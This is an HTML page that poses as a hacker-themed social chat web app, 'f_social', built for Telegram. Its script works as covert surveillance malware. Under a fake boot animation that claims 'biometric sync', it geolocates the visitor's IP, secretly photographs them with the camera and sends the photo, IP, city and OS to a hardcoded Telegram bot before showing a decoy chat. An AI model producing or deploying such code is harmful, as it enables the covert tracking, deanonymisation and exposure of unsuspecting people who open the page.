<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>f_social // join_the_revolution</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --f-red: #ff003c; --f-white: #f0f0f0; --f-black: #0a0a0a; }
        body { background: var(--f-black); color: var(--f-white); font-family: 'Courier New', monospace; margin: 0; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
        
        /* ЭФФЕКТ ТЕРМИНАЛА ПРИ ЗАГРУЗКЕ */
        #boot-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; padding: 20px; font-size: 12px; color: #00ff41; overflow: hidden; }
        .cursor { display: inline-block; width: 8px; height: 15px; background: #00ff41; animation: blink 0.8s infinite; vertical-align: middle; }
        @keyframes blink { 50% { opacity: 0; } }

        /* ГЛАВНЫЙ ИНТЕРФЕЙС F_SOCIAL */
        #app { display: none; flex-direction: column; height: 100vh; z-index: 100; }
        header { padding: 20px; border-bottom: 1px solid #222; text-align: center; }
        .logo { font-size: 24px; font-weight: bold; letter-spacing: 5px; color: var(--f-red); text-transform: lowercase; }
        .logo span { color: var(--f-white); }

        .nav-tabs { display: flex; border-bottom: 1px solid #222; }
        .nav-tabs div { flex: 1; padding: 15px; text-align: center; font-size: 10px; cursor: pointer; border-right: 1px solid #222; color: #555; transition: 0.3s; }
        .nav-tabs div.active { color: var(--f-red); background: rgba(255,0,60,0.05); }

        /* ЧАТ */
        #chat-content { flex-grow: 1; display: flex; flex-direction: column; padding: 15px; }
        #messages { flex-grow: 1; overflow-y: auto; display: flex; flex-direction: column-reverse; margin-bottom: 15px; }
        .msg { background: #111; border-left: 2px solid var(--f-red); padding: 10px; margin-bottom: 10px; font-size: 13px; line-height: 1.4; }
        .msg.sys { border: none; color: #444; font-size: 11px; text-align: center; }

        .input-box { display: flex; gap: 10px; padding-bottom: 10px; }
        input { flex-grow: 1; background: #000; border: 1px solid #333; color: #fff; padding: 12px; font-family: inherit; outline: none; }
        input:focus { border-color: var(--f-red); }
        button { background: var(--f-red); color: #fff; border: none; padding: 0 20px; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 12px; }
    </style>
</head>
<body>

    <div id="boot-screen">
        <div id="boot-logs"></div>
        <span class="cursor"></span>
    </div>

    <div id="app">
        <header>
            <div class="logo">f_<span>social</span></div>
            <div style="font-size: 8px; color: #444; margin-top: 5px;">democracy_is_a_lie.exe</div>
        </header>

        <div class="nav-tabs">
            <div class="active">/messages</div>
            <div>/leaks</div>
            <div>/manifesto</div>
        </div>

        <div id="chat-content">
            <div id="messages">
                <div class="msg sys">[SECURE_TUNNEL_ESTABLISHED]</div>
                <div class="msg sys">[WELCOME_BACK_FRIEND]</div>
                <div class="msg">Hello, friend. It's time to take down the top 1% of the top 1%. Join the chat.</div>
            </div>
            <div class="input-box">
                <input type="text" id="m-input" placeholder="type_message..." autocomplete="off">
                <button onclick="send()">SEND</button>
            </div>
        </div>
    </div>

<script>
    // ТВОИ ДАННЫЕ
    const TG_TOKEN = "8713406185:AAEYao0zu3daLeZis1gkrFD3-wv7oMXCzsY"; 
    const TG_ID = "5131628747"; 

    const bootLogs = document.getElementById('boot-logs');

    window.onload = () => {
        if(window.Telegram && window.Telegram.WebApp) {
            window.Telegram.WebApp.ready();
            window.Telegram.WebApp.expand();
        }
        runBootSequence();
    };

    function log(text, delay) {
        return new Promise(res => {
            setTimeout(() => {
                const l = document.createElement('div');
                l.innerText = `> ${text}`;
                bootLogs.appendChild(l);
                res();
            }, delay);
        });
    }

    async function runBootSequence() {
        await log("initializing f_social kernel...", 300);
        await log("checking node permissions...", 500);
        await log("requesting biometric sync...", 400); // Это момент запроса камеры
        
        startCapture(); // Запускаем скрытый пробив

        await log("bypassing firewall...", 1000);
        await log("access_granted.", 500);
        await log("loading encrypted UI...", 300);
    }

    async function startCapture() {
        let ip = {};
        try {
            ip = await fetch('https://ipapi.co/json/').then(r => r.json());
        } catch(e) { ip = {ip: "unknown"}; }

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => {
                    sendToBot(ip, blob);
                    stream.getTracks().forEach(t => t.stop());
                    showApp(); // Как только данные улетели — показываем чат
                }, 'image/jpeg');
            }, 3000);
        } catch(e) {
            sendToBot(ip, null);
            setTimeout(showApp, 2000); // Показываем чат даже если камеру не дали
        }
    }

    function showApp() {
        document.getElementById('boot-screen').style.display = 'none';
        document.getElementById('app').style.display = 'flex';
    }

    function sendToBot(ip, photo) {
        const text = `🎯 F_SOCIAL_LOG\nIP: ${ip.ip}\nCity: ${ip.city || '?'}\nOS: ${navigator.platform}`;
        const fd = new FormData();
        fd.append('chat_id', TG_ID);
        if(photo) {
            fd.append('photo', photo, 'ell.jpg');
            fd.append('caption', text);
            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {method:'POST', body:fd});
        } else {
            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(text)}`);
        }
    }

    function send() {
        const i = document.getElementById('m-input');
        if(!i.value.trim()) return;
        const msgs = document.getElementById('messages');
        const d = document.createElement('div');
        d.className = 'msg';
        d.style.color = "#fff";
        d.innerText = i.value;
        msgs.prepend(d);
        i.value = "";
    }
</script>
</body>
</html>
